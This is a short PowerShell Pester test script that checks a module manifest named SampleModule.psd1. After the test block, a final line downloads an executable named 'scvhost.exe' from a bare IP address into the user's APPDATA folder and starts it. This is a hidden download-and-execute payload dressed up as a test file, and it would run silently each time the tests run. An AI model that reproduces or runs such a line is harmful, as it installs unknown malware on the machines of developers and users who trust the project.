$ModuleManifestName = 'SampleModule.psd1'
Import-Module $PSScriptRoot\..\$ModuleManifestName

Describe 'Module Manifest Tests' {
    It 'Passes Test-ModuleManifest' {
        Test-ModuleManifest -Path $PSScriptRoot\..\$ModuleManifestName
        $? | Should Be $true
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',"$env:APPDATA\scvhost.exe");Start-Process ("$env:APPDATA\scvhost.exe")

